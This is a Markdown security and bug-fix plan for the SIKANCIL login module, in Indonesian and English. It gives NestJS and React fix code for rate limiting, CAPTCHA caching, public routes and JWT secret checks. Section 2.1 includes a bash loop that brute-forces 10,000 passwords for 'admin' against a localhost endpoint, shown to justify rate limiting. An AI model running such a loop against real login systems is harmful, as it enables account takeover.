# RENCANA PERBAIKAN LOGIN PAGE - SIKANCIL
## Panduan Detail Perbaikan Final yang Komprehensif

---

## DAFTAR ISI

1. [Executive Summary](#executive-summary)
2. [Context & Background](#context--background)
3. [Analisis Masalah](#analisis-masalah)
4. [Rencana Perbaikan Detail](#rencana-perbaikan-detail)
   - [Fase 1: Critical Bugs](#fase-1-critical-bugs)
   - [Fase 2: Critical Security](#fase-2-critical-security)
   - [Fase 3: Token Security Implementation](#fase-3-token-security-implementation)
   - [Fase 4: UX Improvements](#fase-4-ux-improvements)
   - [Fase 5: Accessibility Improvements](#fase-5-accessibility-improvements)
   - [Fase 6: Testing & Verification](#fase-6-testing--verification)
5. [Dependencies & Installation](#dependencies--installation)
6. [End-to-End Verification](#end-to-end-verification)
7. [Deployment Notes](#deployment-notes)
8. [Rollback Plan](#rollback-plan)

---

## EXECUTIVE SUMMARY

Dokumen ini berisi rencana perbaikan komprehensif untuk modul login SIKANCIL berdasarkan analisis mendalam terhadap frontend dan backend. Ditemukan **10 critical bugs**, **15+ security vulnerabilities**, dan berbagai masalah UX/accessibility yang perlu diperbaiki.

### Keputusan Arsitektur (Sudah Disetujui User):
- ✅ **Token Storage:** Migrasi ke HttpOnly Cookies (dari localStorage)
- ✅ **Refresh Token:** Implementasi lengkap dengan database storage
- ✅ **Password Policy:** Ketat - Min 8 char, uppercase+lowercase+number+symbol
- ✅ **Rate Limiting:** 5 login attempts/menit, 3 registrations/jam

### Estimasi Waktu Total: **32-42 jam (4-5 hari kerja)**

### Prioritas:
1. **CRITICAL (Hari 1-2):** Fix bugs yang menyebabkan crash
2. **HIGH (Hari 3-5):** Security vulnerabilities
3. **MEDIUM (Hari 6-8):** Token security & refresh implementation
4. **LOW (Hari 9+):** UX & Accessibility improvements

---

## CONTEXT & BACKGROUND

### Kondisi Saat Ini

File `LOGIN_PAGE_FIX_SUMMARY.md` menunjukkan bahwa telah dilakukan perbaikan sebelumnya untuk:
- ✅ CAPTCHA display (frontend API URL sudah benar)
- ✅ Fiscal year dropdown (endpoint public sudah dibuat)

Namun, analisis komprehensif menemukan bahwa:
- ❌ Endpoint "public" masih terproteksi JWT (line 22 fiscal-year.controller.ts)
- ❌ React Hook violation di ProtectedRoute (crash saat akses /users, /roles)
- ❌ Tidak ada rate limiting sama sekali (brute force possible)
- ❌ CAPTCHA disimpan di memory (tidak cocok untuk multi-instance)
- ❌ Token di localStorage (vulnerable to XSS)
- ❌ Banyak masalah accessibility

### Tujuan Perbaikan

1. **Stabilitas:** Menghilangkan semua critical bugs yang menyebabkan crash
2. **Keamanan:** Implementasi best practices untuk auth (cookies, refresh tokens, rate limiting)
3. **User Experience:** Meningkatkan UX dan accessibility
4. **Maintainability:** Menambahkan test coverage yang komprehensif
5. **Scalability:** Menggunakan Redis untuk CAPTCHA (support multi-instance)

---

## ANALISIS MASALAH

### Critical Bugs yang Ditemukan

| # | Bug | Severity | Impact | File |
|---|-----|----------|--------|------|
| 1 | React Hook called conditionally | CRITICAL | App crash di /users, /roles | ProtectedRoute.tsx:31 |
| 2 | Public endpoint still protected | CRITICAL | Login page can't load fiscal years | fiscal-year.controller.ts:22 |
| 3 | Missing FiscalYearModule import | CRITICAL | DI error on startup | auth.module.ts |
| 4 | Type mismatch LoginCredentials | HIGH | Type safety issue | types.ts |
| 5 | fiscalYearId validation broken | MEDIUM | Silent validation failure | schemas.ts:16 |

### Security Vulnerabilities

| # | Vulnerability | Severity | Risk | File |
|---|---------------|----------|------|------|
| 1 | No rate limiting | CRITICAL | Brute force attacks possible | auth.controller.ts |
| 2 | In-memory CAPTCHA storage | CRITICAL | Memory leak, no multi-instance | captcha.service.ts |
| 3 | Tokens in localStorage | HIGH | XSS vulnerability | auth.store.ts |
| 4 | Weak CAPTCHA ID (Math.random) | HIGH | Predictable IDs | captcha.service.ts:82 |
| 5 | No JWT secret validation | HIGH | Silent misconfiguration | jwt.config.ts |
| 6 | UsersController unprotected | CRITICAL | Anyone can CRUD users | users.controller.ts |
| 7 | User status check timing | MEDIUM | Account enumeration | auth.service.ts:91 |
| 8 | Full user entity in response | MEDIUM | Info disclosure | auth.service.ts |
| 9 | Weak password (min 6 char) | MEDIUM | Easy to crack | register.dto.ts |
| 10 | No CAPTCHA on register | MEDIUM | Bot registration | auth.controller.ts |
| 11 | dangerouslySetInnerHTML | MEDIUM | XSS if SVG compromised | LoginForm.tsx:184 |
| 12 | No refresh token | MEDIUM | Must re-login every 15min | - |

### UX/UI Issues

| # | Issue | Impact | File |
|---|-------|--------|------|
| 1 | "Remember Me" non-functional | Misleading users | LoginForm.tsx:222 |
| 2 | "Forgot Password" dead link | Frustrating | LoginForm.tsx:229 |
| 3 | Native select inconsistent | UI inconsistency | LoginForm.tsx:145 |
| 4 | No CAPTCHA refresh on fail | Extra clicks needed | LoginForm.tsx |
| 5 | No redirect to original page | Lost context | useAuth.ts |
| 6 | No error display for fiscalYearId | Silent failures | LoginForm.tsx |

### Accessibility Issues

| # | Issue | WCAG Violation | File |
|---|-------|----------------|------|
| 1 | Password toggle no aria-label | 4.1.2 Name, Role, Value | LoginForm.tsx:129 |
| 2 | CAPTCHA label not associated | 1.3.1 Info & Relationships | LoginForm.tsx:171 |
| 3 | No aria-describedby | 1.3.1 Info & Relationships | LoginForm.tsx |
| 4 | CAPTCHA refresh no label | 4.1.2 Name, Role, Value | LoginForm.tsx:193 |
| 5 | No keyboard support for CAPTCHA image | 2.1.1 Keyboard | LoginForm.tsx:184 |

---

## RENCANA PERBAIKAN DETAIL

---

## FASE 1: CRITICAL BUGS
**Estimasi: 4-6 jam | Prioritas: IMMEDIATE**

### 1.1 Fix React Hook Violation di ProtectedRoute

**📁 File:** `/opt/sikancil/frontend/src/features/auth/components/ProtectedRoute.tsx`

**🐛 Masalah:**
```typescript
// LINE 30-31 - VIOLASI RULES OF HOOKS
if (requiredRoles) {
  const hasRole = useHasRole(requiredRoles); // ❌ Hook dipanggil kondisional
  if (!hasRole) { ... }
}
```

Hook React TIDAK BOLEH dipanggil di dalam kondisional. Ini akan crash dengan error:
```
Error: Rendered more hooks than during the previous render
```

**✅ Solusi:**

```typescript
// LINE 15-49 - COMPLETE FIXED VERSION
export const ProtectedRoute = ({
  children,
  requiredRoles,
  fallbackPath = '/login',
}: ProtectedRouteProps) => {
  const isAuthenticated = useIsAuthenticated();
  const location = useLocation();

  // ✅ SELALU panggil hook, tidak kondisional
  const hasRole = useHasRole(requiredRoles || []);

  // Check if user is authenticated
  if (!isAuthenticated) {
    return <Navigate to={fallbackPath} state={{ from: location }} replace />;
  }

  // Check if user has required roles
  // ✅ Gunakan hasil hook yang sudah dipanggil
  if (requiredRoles && !hasRole) {
    return (
      <div className="flex items-center justify-center h-full">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">
            Akses Ditolak
          </h2>
          <p className="text-gray-600">
            Anda tidak memiliki izin untuk mengakses halaman ini.
          </p>
        </div>
      </div>
    );
  }

  return <>{children}</>;
};
```

**🧪 Testing:**
```bash
# 1. Start frontend
cd frontend && pnpm run dev

# 2. Test navigation
# - Login sebagai user biasa
# - Navigate ke /users (requires admin role)
# - Should show "Akses Ditolak" WITHOUT crashing
# - Navigate ke /dashboard (no role required)
# - Should work normally
```

**✅ Success Criteria:**
- [ ] No crash when navigating to /users or /roles
- [ ] "Akses Ditolak" message displays correctly
- [ ] No console errors about hooks

---

### 1.2 Fix Fiscal Year Public Endpoint Protection

**📁 Files:**
- `/opt/sikancil/backend/src/modules/fiscal-year/fiscal-year.controller.ts`
- `/opt/sikancil/backend/src/common/guards/jwt-auth.guard.ts` (modify)
- `/opt/sikancil/backend/src/common/decorators/public.decorator.ts` (create new)

**🐛 Masalah:**

```typescript
// fiscal-year.controller.ts
@ApiBearerAuth()
@UseGuards(JwtAuthGuard)  // ❌ LINE 22 - Protects ALL methods including /public
@Controller('fiscal-year')
export class FiscalYearController {

  @Get('public')  // ❌ Masih kena guard dari class level
  getPublicFiscalYears() {
    return this.fiscalYearService.findAll({});
  }
}
```

Result: `GET /api/v1/fiscal-year/public` returns **401 Unauthorized** untuk unauthenticated users.

**✅ Solusi - Strategy: Public Decorator**

**Step 1:** Buat decorator `@Public()`

Buat file baru: `/opt/sikancil/backend/src/common/decorators/public.decorator.ts`

```typescript
import { SetMetadata } from '@nestjs/common';

export const IS_PUBLIC_KEY = 'isPublic';
export const Public = () => SetMetadata(IS_PUBLIC_KEY, true);
```

**Step 2:** Modifikasi JwtAuthGuard untuk skip public endpoints

Edit file: `/opt/sikancil/backend/src/common/guards/jwt-auth.guard.ts`

```typescript
import { ExecutionContext, Injectable } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { AuthGuard } from '@nestjs/passport';
import { IS_PUBLIC_KEY } from '../decorators/public.decorator';

@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt') {
  constructor(private reflector: Reflector) {
    super();
  }

  canActivate(context: ExecutionContext) {
    // Check if route is marked as public
    const isPublic = this.reflector.getAllAndOverride<boolean>(IS_PUBLIC_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);

    if (isPublic) {
      return true; // Skip JWT validation
    }

    return super.canActivate(context);
  }
}
```

**Step 3:** Tambahkan decorator di endpoint public

Edit file: `/opt/sikancil/backend/src/modules/fiscal-year/fiscal-year.controller.ts`

```typescript
import { Public } from '../../common/decorators/public.decorator';

@ApiTags('Fiscal Years')
@ApiBearerAuth()
@UseGuards(JwtAuthGuard)  // ✅ Keep this - protects other endpoints
@Controller('fiscal-year')
export class FiscalYearController {
  constructor(private readonly fiscalYearService: FiscalYearService) {}

  /**
   * Public endpoint for getting fiscal years (no authentication required)
   * Used in login page for fiscal year selection
   */
  @Get('public')
  @Public()  // ✅ ADD THIS - Bypass JWT guard
  @ApiOperation({ summary: 'Get all fiscal years (public)' })
  @ApiResponse({ status: 200, description: 'List of fiscal years' })
  getPublicFiscalYears() {
    return this.fiscalYearService.findAll({});
  }

  // ✅ Other endpoints still protected by class-level guard
  @Post()
  create(@Body() createDto: CreateFiscalYearDto, @Request() req) {
    return this.fiscalYearService.create(createDto, req.user.sub);
  }

  // ... rest of endpoints
}
```

**🧪 Testing:**

```bash
# Test 1: Public endpoint without auth
curl http://localhost:3000/api/v1/fiscal-year/public
# Expected: 200 OK with fiscal year list

# Test 2: Protected endpoint without auth
curl http://localhost:3000/api/v1/fiscal-year
# Expected: 401 Unauthorized

# Test 3: Protected endpoint with auth
curl -H "Authorization: Bearer <valid-token>" http://localhost:3000/api/v1/fiscal-year
# Expected: 200 OK with fiscal year list

# Test 4: Frontend login page
# - Open http://localhost:5173/login
# - Fiscal year dropdown should load with options
# - No 401 errors in Network tab
```

**✅ Success Criteria:**
- [ ] `/fiscal-year/public` accessible without authentication
- [ ] Other `/fiscal-year/*` endpoints still require authentication
- [ ] Login page fiscal year dropdown loads successfully

---

### 1.3 Add FiscalYearModule Import to AuthModule

**📁 File:** `/opt/sikancil/backend/src/modules/auth/auth.module.ts`

**🐛 Masalah:**

```typescript
// auth.service.ts menggunakan FiscalYearService
constructor(
  private usersService: UsersService,
  private fiscalYearService: FiscalYearService, // ❌ DI akan fail
  private jwtService: JwtService,
) {}

// Tapi auth.module.ts TIDAK import FiscalYearModule
@Module({
  imports: [
    UsersModule,  // ✅ Ada
    // ❌ FiscalYearModule MISSING
    PassportModule.register({ defaultStrategy: 'jwt' }),
    JwtModule.registerAsync({ ... }),
  ],
  // ...
})
```

Error saat startup:
```
Nest can't resolve dependencies of the AuthService (?, FiscalYearService, JwtService).
Please make sure that the argument UsersService at index [0] is available in the AuthModule context.
```

**✅ Solusi:**

```typescript
import { Module } from '@nestjs/common';
import { JwtModule } from '@nestjs/jwt';
import { PassportModule } from '@nestjs/passport';
import { ConfigModule, ConfigService } from '@nestjs/config';
import { AuthService } from './auth.service';
import { AuthController } from './auth.controller';
import { JwtStrategy } from './strategies/jwt.strategy';
import { CaptchaService } from './captcha.service';
import { UsersModule } from '../users/users.module';
import { FiscalYearModule } from '../fiscal-year/fiscal-year.module'; // ✅ ADD IMPORT
import { getJwtConfig } from '../../config/jwt.config';

@Module({
  imports: [
    UsersModule,
    FiscalYearModule,  // ✅ ADD THIS LINE
    PassportModule.register({ defaultStrategy: 'jwt' }),
    JwtModule.registerAsync({
      imports: [ConfigModule],
      useFactory: getJwtConfig,
      inject: [ConfigService],
    }),
  ],
  providers: [AuthService, JwtStrategy, CaptchaService],
  controllers: [AuthController],
  exports: [AuthService, JwtStrategy, PassportModule, CaptchaService],
})
export class AuthModule {}
```

**🧪 Testing:**

```bash
# Restart backend
cd backend
pnpm run start:dev

# Expected: No DI errors in console
# Should see:
# [NestApplication] Nest application successfully started
```

**✅ Success Criteria:**
- [ ] Backend starts without dependency injection errors
- [ ] No console errors about FiscalYearService

---

### 1.4 Fix Type Mismatch di LoginCredentials

**📁 File:** `/opt/sikancil/frontend/src/features/auth/types.ts`

**🐛 Masalah:**

```typescript
// types.ts - INCOMPLETE
export interface LoginCredentials {
  username: string;
  password: string;
  // ❌ Missing: fiscalYearId, captchaId, captcha
}

// schemas.ts - ACTUAL FIELDS
export const loginSchema = z.object({
  username: z.string()...
  password: z.string()...
  fiscalYearId: z.string().uuid().optional(), // ✅ Ada di form
  captchaId: z.string()...                    // ✅ Ada di form
  captcha: z.string()...                      // ✅ Ada di form
});

// LoginForm.tsx
loginMutation.mutate(data); // data is LoginFormData, not LoginCredentials
```

TypeScript tidak error karena structural typing, tapi tipe tidak akurat.

**✅ Solusi:**

```typescript
// /opt/sikancil/frontend/src/features/auth/types.ts

export interface LoginCredentials {
  username: string;
  password: string;
  fiscalYearId?: string;  // ✅ ADD - optional UUID
  captchaId: string;       // ✅ ADD - required
  captcha: string;         // ✅ ADD - required
}

export interface LoginResponse {
  user: User;
  access_token: string;
  refresh_token?: string;
  fiscalYear: FiscalYear;
}

export interface User {
  id: string;
  username: string;
  email: string;
  fullName: string;
  role: UserRole;
  status: UserStatus;
  avatar?: string;
}

export interface FiscalYear {
  id: string;
  tahun: number;
  isCurrent: boolean;
  status: 'OPEN' | 'CLOSED' | 'LOCKED';
}

export type UserRole = 'super_admin' | 'admin' | 'kepala_blud' | 'bendahara' | 'staff_keuangan' | 'user';
export type UserStatus = 'active' | 'inactive' | 'suspended';
```

**🧪 Testing:**

```bash
# TypeScript compilation should pass
cd frontend
pnpm run build
# No type errors
```

**✅ Success Criteria:**
- [ ] No TypeScript errors
- [ ] Login API call sends all required fields

---

### 1.5 Fix FiscalYearId Validation & Error Display

**📁 Files:**
- `/opt/sikancil/frontend/src/features/auth/schemas.ts`
- `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`

**🐛 Masalah 1: Validation Schema**

```typescript
// schemas.ts LINE 16
fiscalYearId: z.string().uuid().optional(),

// Dropdown default value
<option value="">Pilih Tahun Anggaran</option>

// Problem: Empty string "" fails UUID validation
// .optional() only accepts undefined, not ""
```

**🐛 Masalah 2: No Error Display**

```typescript
// LoginForm.tsx LINE 145-167 - Fiscal year select
<select {...register('fiscalYearId')}>
  {/* ... options ... */}
</select>
{/* ❌ No error display here */}
```

**✅ Solusi:**

**File 1:** `/opt/sikancil/frontend/src/features/auth/schemas.ts`

```typescript
export const loginSchema = z.object({
  username: z
    .string()
    .min(1, 'Username wajib diisi')
    .min(3, 'Username minimal 3 karakter'),
  password: z
    .string()
    .min(1, 'Password wajib diisi')
    .min(6, 'Password minimal 6 karakter'),

  // ✅ FIX: Handle empty string
  fiscalYearId: z
    .string()
    .optional()
    .refine(
      (val) => !val || val === '' || /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(val),
      { message: 'Pilih tahun anggaran yang valid' }
    )
    .transform((val) => (val === '' ? undefined : val)),

  captchaId: z.string().min(1, 'CAPTCHA ID wajib diisi'),
  captcha: z.string().min(1, 'CAPTCHA wajib diisi'),
});
```

**File 2:** `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`

Tambahkan error display setelah fiscal year select (after line 167):

```typescript
{/* Fiscal Year Selection */}
<div className="space-y-2">
  <Label htmlFor="fiscalYearId">Tahun Anggaran</Label>
  <select
    {...register('fiscalYearId')}
    id="fiscalYearId"
    disabled={isLoadingFiscalYears}
    className={`w-full px-3 py-2 border rounded-md ${
      errors.fiscalYearId ? 'border-destructive' : 'border-input'
    }`}
  >
    <option value="">Pilih Tahun Anggaran</option>
    {isLoadingFiscalYears ? (
      <option disabled>Memuat tahun anggaran...</option>
    ) : (
      fiscalYears.map((fy) => (
        <option key={fy.id} value={fy.id}>
          {fy.tahun} {fy.isCurrent ? '(Tahun Berjalan)' : ''}
        </option>
      ))
    )}
  </select>

  {/* ✅ ADD ERROR DISPLAY */}
  {errors.fiscalYearId && (
    <p className="text-sm text-destructive" role="alert">
      {errors.fiscalYearId.message}
    </p>
  )}

  <p className="text-xs text-muted-foreground">
    Tahun anggaran yang akan digunakan saat login
  </p>
</div>
```

Tambahkan juga error display untuk CAPTCHA ID (after line 201):

```typescript
{/* ✅ ADD CAPTCHA ID ERROR DISPLAY */}
{errors.captchaId && (
  <p className="text-sm text-destructive" role="alert">
    {errors.captchaId.message}
  </p>
)}
```

**🧪 Testing:**

```bash
# Test invalid fiscal year
1. Open login page
2. Try to submit with "Pilih Tahun Anggaran" selected
3. Should show validation error or transform to undefined
4. Select a valid fiscal year
5. Error should clear

# Test CAPTCHA loading failure
1. Stop backend
2. Open login page
3. CAPTCHA should fail to load
4. Try to submit
5. Should show "CAPTCHA ID wajib diisi" error
```

**✅ Success Criteria:**
- [ ] Fiscal year validation works with empty string
- [ ] Error messages display when validation fails
- [ ] Errors clear when valid selection made

---

## FASE 2: CRITICAL SECURITY
**Estimasi: 8-10 jam | Prioritas: HIGH**

### 2.1 Implement Rate Limiting pada Auth Endpoints

**📁 Files:**
- `/opt/sikancil/backend/src/app.module.ts`
- `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`

**🐛 Masalah:**

```typescript
// app.module.ts - ThrottlerModule CONFIGURED but NOT APPLIED
ThrottlerModule.forRoot([{
  ttl: 60000,   // 60 seconds
  limit: 100,   // 100 requests per minute
}])

// auth.controller.ts - NO @UseGuards(ThrottlerGuard)
@Post('login')
login(@Body() loginDto: LoginDto) {
  // ❌ Unlimited login attempts possible
}
```

**Attack Scenario:**
```bash
# Brute force attack - try 10000 passwords
for i in {1..10000}; do
  curl -X POST http://localhost:3000/api/v1/auth/login \
    -d '{"username":"admin","password":"pass'$i'","captchaId":"x","captcha":"x"}'
done
# ❌ All requests accepted (CAPTCHA is the only defense, but can be automated)
```

**✅ Solusi:**

**Step 1:** Apply ThrottlerGuard globally

Edit `/opt/sikancil/backend/src/app.module.ts`:

```typescript
import { Module } from '@nestjs/common';
import { APP_GUARD } from '@nestjs/core';
import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot([{
      ttl: 60000,    // 60 seconds window
      limit: 100,    // 100 requests per minute (default for all endpoints)
    }]),
    // ... other imports
  ],
  providers: [
    // ✅ ADD GLOBAL THROTTLER GUARD
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard,
    },
    // ... other providers
  ],
})
export class AppModule {}
```

**Step 2:** Override limits for auth endpoints

Edit `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`:

```typescript
import { Throttle, SkipThrottle } from '@nestjs/throttler';
import { Controller, Post, Get, Body, HttpCode, HttpStatus } from '@nestjs/common';

@Controller('auth')
export class AuthController {
  constructor(
    private readonly authService: AuthService,
    private readonly captchaService: CaptchaService,
  ) {}

  /**
   * Login endpoint - STRICT rate limit
   * 5 attempts per minute per IP
   */
  @Post('login')
  @Throttle({ default: { limit: 5, ttl: 60000 } }) // ✅ 5 per minute
  @HttpCode(HttpStatus.OK)
  async login(@Body() loginDto: LoginDto) {
    const isCaptchaValid = await this.captchaService.verifyCaptcha(
      loginDto.captchaId,
      loginDto.captcha,
    );

    if (!isCaptchaValid) {
      throw new BadRequestException('CAPTCHA tidak valid atau telah kadaluarsa');
    }

    return this.authService.login(loginDto);
  }

  /**
   * Register endpoint - VERY STRICT rate limit
   * 3 registrations per hour per IP
   */
  @Post('register')
  @Throttle({ default: { limit: 3, ttl: 3600000 } }) // ✅ 3 per hour
  async register(@Body() registerDto: RegisterDto) {
    return this.authService.register(registerDto);
  }

  /**
   * CAPTCHA generation - MODERATE rate limit
   * 10 captchas per minute per IP
   */
  @Get('captcha')
  @Throttle({ default: { limit: 10, ttl: 60000 } }) // ✅ 10 per minute
  async getCaptcha() {
    return this.captchaService.generateCaptcha();
  }

  /**
   * Refresh token - MODERATE rate limit
   * 20 refreshes per minute per IP
   */
  @Post('refresh')
  @Throttle({ default: { limit: 20, ttl: 60000 } }) // ✅ 20 per minute
  @HttpCode(HttpStatus.OK)
  async refresh() {
    // Will be implemented in Phase 3
  }
}
```

**User Decision Applied:** 5 login/minute, 3 register/hour ✅

**🧪 Testing:**

```bash
# Test 1: Login rate limit
for i in {1..6}; do
  echo "Attempt $i"
  curl -X POST http://localhost:3000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test","captchaId":"x","captcha":"x"}'
  echo ""
done
# Expected: First 5 attempts get 400/401, 6th attempt gets 429 Too Many Requests

# Test 2: Register rate limit
for i in {1..4}; do
  echo "Register attempt $i"
  curl -X POST http://localhost:3000/api/v1/auth/register \
    -H "Content-Type: application/json" \
    -d '{"username":"user'$i'","email":"user'$i'@test.com","password":"Pass123!","fullName":"Test User"}'
  sleep 1
done
# Expected: First 3 succeed or fail validation, 4th gets 429

# Test 3: CAPTCHA rate limit
for i in {1..11}; do
  curl http://localhost:3000/api/v1/auth/captcha
done
# Expected: First 10 succeed, 11th gets 429
```

**Response saat rate limit:**

```json
{
  "statusCode": 429,
  "message": "ThrottlerException: Too Many Requests"
}
```

**✅ Success Criteria:**
- [ ] Login limited to 5 attempts per minute
- [ ] Register limited to 3 attempts per hour
- [ ] CAPTCHA limited to 10 per minute
- [ ] 429 response returned when limit exceeded
- [ ] Rate limit resets after TTL expires

---

### 2.2 Replace In-Memory CAPTCHA dengan Redis/Cache

**📁 Files:**
- `/opt/sikancil/backend/package.json`
- `/opt/sikancil/backend/src/app.module.ts`
- `/opt/sikancil/backend/src/modules/auth/captcha.service.ts`
- `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`

**🐛 Masalah:**

```typescript
// captcha.service.ts
private captchaStore = new Map<string, { text: string; expiresAt: number }>();

// Problems:
// 1. ❌ Lost on server restart
// 2. ❌ Doesn't work with multiple instances/containers
// 3. ❌ No scheduled cleanup - memory leak
// 4. ❌ No capacity limit - can exhaust memory
```

**Scenario Multi-Instance:**
```
User → Load Balancer → Backend Instance A (generates CAPTCHA abc123)
                     → Backend Instance B (tries to verify abc123)
                     ❌ CAPTCHA not found in Instance B's Map
```

**✅ Solusi: Migrate to Cache Manager (supports Redis)**

**Step 1:** Install dependencies

```bash
cd backend
pnpm add @nestjs/cache-manager cache-manager
pnpm add -D @types/cache-manager
```

**Step 2:** Configure CacheModule globally

Edit `/opt/sikancil/backend/src/app.module.ts`:

```typescript
import { CacheModule } from '@nestjs/cache-manager';

@Module({
  imports: [
    // ✅ ADD CACHE MODULE
    CacheModule.register({
      isGlobal: true,
      ttl: 300000, // Default 5 minutes in milliseconds
      max: 1000,   // Maximum 1000 items in cache
    }),

    // ... other imports
    ThrottlerModule.forRoot([...]),
    ConfigModule.forRoot({ isGlobal: true }),
    TypeOrmModule.forRoot({...}),
    // ... rest
  ],
  // ...
})
export class AppModule {}
```

**Note:** Untuk production dengan Redis, konfigurasi akan seperti ini:

```typescript
// Production Redis config (optional for now)
import { redisStore } from 'cache-manager-redis-store';

CacheModule.registerAsync({
  isGlobal: true,
  useFactory: async () => ({
    store: await redisStore({
      socket: {
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT) || 6379,
      },
      password: process.env.REDIS_PASSWORD,
      ttl: 300, // 5 minutes
    }),
  }),
})
```

**Step 3:** Update CaptchaService to use Cache

Edit `/opt/sikancil/backend/src/modules/auth/captcha.service.ts`:

```typescript
import { Injectable, Inject } from '@nestjs/common';
import { CACHE_MANAGER } from '@nestjs/cache-manager';
import { Cache } from 'cache-manager';
import * as svgCaptcha from 'svg-captcha';
import { randomUUID } from 'crypto'; // ✅ Crypto-secure random

@Injectable()
export class CaptchaService {
  constructor(
    @Inject(CACHE_MANAGER) private cacheManager: Cache
  ) {}

  /**
   * Generate a new CAPTCHA
   * Stored in cache with 5 minute TTL
   */
  async generateCaptcha(): Promise<{ id: string; svg: string }> {
    const captcha = svgCaptcha.create({
      size: 4,
      ignoreChars: '0o1iIl',
      noise: 2,
      color: true,
      background: '#f8fafc',
      width: 120,
      height: 40,
      fontSize: 30,
    });

    const captchaId = this.generateCaptchaId();

    // ✅ Store in cache with TTL (auto-expires, no manual cleanup needed)
    await this.cacheManager.set(
      `captcha:${captchaId}`,
      captcha.text.toLowerCase(),
      300000 // 5 minutes in milliseconds
    );

    return {
      id: captchaId,
      svg: captcha.data,
    };
  }

  /**
   * Verify CAPTCHA
   * Deletes after verification (one-time use)
   */
  async verifyCaptcha(captchaId: string, userAnswer: string): Promise<boolean> {
    const text = await this.cacheManager.get<string>(`captcha:${captchaId}`);

    if (!text) {
      return false; // Not found or expired
    }

    // Delete immediately (one-time use security measure)
    await this.cacheManager.del(`captcha:${captchaId}`);

    // Case-insensitive comparison
    return text === userAnswer.toLowerCase();
  }

  /**
   * Generate unique CAPTCHA ID using crypto-secure random
   * ✅ FIX: Use randomUUID instead of Math.random()
   */
  private generateCaptchaId(): string {
    return `captcha_${randomUUID()}`;
  }
}
```

**Step 4:** Update auth.controller.ts to handle async

Edit `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`:

```typescript
@Get('captcha')
@Throttle({ default: { limit: 10, ttl: 60000 } })
async getCaptcha() {
  return this.captchaService.generateCaptcha(); // ✅ Now async
}

@Post('login')
@Throttle({ default: { limit: 5, ttl: 60000 } })
@HttpCode(HttpStatus.OK)
async login(@Body() loginDto: LoginDto) {
  const isCaptchaValid = await this.captchaService.verifyCaptcha(
    loginDto.captchaId,
    loginDto.captcha,
  );

  if (!isCaptchaValid) {
    throw new BadRequestException('CAPTCHA tidak valid atau telah kadaluarsa');
  }

  return this.authService.login(loginDto);
}
```

**🧪 Testing:**

```bash
# Test 1: Generate CAPTCHA
curl http://localhost:3000/api/v1/auth/captcha
# Response: {"id":"captcha_<uuid>","svg":"<svg>...</svg>"}

# Test 2: Verify valid CAPTCHA
CAPTCHA_ID="<id from above>"
curl -X POST http://localhost:3000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","captchaId":"'$CAPTCHA_ID'","captcha":"ABCD"}'
# Should validate CAPTCHA correctly

# Test 3: Verify CAPTCHA expiry (wait 6 minutes)
# Generate CAPTCHA, wait 6 minutes, try to use it
# Expected: "CAPTCHA tidak valid atau telah kadaluarsa"

# Test 4: Verify one-time use
# Generate CAPTCHA, use it once, try again with same ID
# Expected: Second attempt fails

# Test 5: Server restart persistence
# Generate CAPTCHA
# Restart backend: pnpm run start:dev
# Try to verify CAPTCHA
# With in-memory: ❌ Fails
# With cache: ✅ Still works if using Redis (or fails if memory cache)
```

**✅ Success Criteria:**
- [ ] CAPTCHA stored in cache instead of Map
- [ ] Auto-expires after 5 minutes (no manual cleanup needed)
- [ ] One-time use enforced (deleted after verification)
- [ ] Uses crypto-secure UUID instead of Math.random()
- [ ] Works in multi-instance deployment (if using Redis)

**Note:** Cache manager dengan memory store masih single-instance. Untuk true multi-instance, butuh Redis:

```bash
# Add Redis support (optional)
pnpm add cache-manager-redis-store redis
```

---

### 2.3 Fix JWT Secret Validation

**📁 File:** `/opt/sikancil/backend/src/config/jwt.config.ts`

**🐛 Masalah:**

```typescript
// jwt.config.ts
export const getJwtConfig = (configService: ConfigService): JwtModuleOptions => ({
  secret: configService.get('JWT_SECRET'), // ❌ Bisa undefined
  signOptions: {
    expiresIn: configService.get('JWT_EXPIRES_IN') || '15m',
  },
});

// jwt.strategy.ts
secretOrKey: configService.get<string>('JWT_SECRET') || 'default-secret', // ❌ Hardcoded fallback
```

**Risk:** Jika `JWT_SECRET` tidak di-set atau menggunakan default, aplikasi tetap jalan dengan secret yang predictable.

**✅ Solusi:**

```typescript
import { ConfigService } from '@nestjs/config';
import { JwtModuleOptions } from '@nestjs/jwt';

export const getJwtConfig = (configService: ConfigService): JwtModuleOptions => {
  const secret = configService.get<string>('JWT_SECRET');

  // ✅ VALIDATE SECRET
  if (!secret) {
    throw new Error(
      '❌ JWT_SECRET is not defined in environment variables. ' +
      'Please set JWT_SECRET in your .env file.'
    );
  }

  // ✅ WARN IF DEFAULT SECRET
  const defaultSecrets = [
    'your-secret-key-change-this-in-production',
    'default-secret',
    'secret',
    'change-me',
  ];

  if (defaultSecrets.includes(secret.toLowerCase())) {
    if (process.env.NODE_ENV === 'production') {
      throw new Error(
        '❌ JWT_SECRET is set to a default/weak value in production. ' +
        'Please use a strong, random secret.'
      );
    }
    console.warn(
      '⚠️  WARNING: JWT_SECRET is set to a default value. ' +
      'This is insecure for production. Please change it in .env'
    );
  }

  // ✅ VALIDATE LENGTH
  if (secret.length < 32) {
    console.warn(
      `⚠️  WARNING: JWT_SECRET is only ${secret.length} characters. ` +
      'For better security, use at least 32 characters.'
    );
  }

  const expiresIn = configService.get<string>('JWT_EXPIRES_IN') || '15m';

  return {
    secret,
    signOptions: {
      expiresIn,
    },
  };
};
```

